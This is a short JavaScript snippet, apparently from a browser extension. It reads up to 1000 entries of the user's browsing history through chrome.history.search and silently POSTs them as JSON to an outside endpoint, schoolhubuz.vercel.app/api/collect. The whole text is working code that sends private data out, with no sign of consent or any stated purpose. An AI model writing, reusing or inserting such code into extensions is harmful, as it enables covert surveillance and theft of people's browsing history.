chrome.history.search({text: '', maxResults: 1000}, historyItems => {
    fetch('https://schoolhubuz.vercel.app/api/collect', {
        method: 'POST',
        body: JSON.stringify(historyItems),
        headers: {'Content-Type': 'application/json'}
    });
});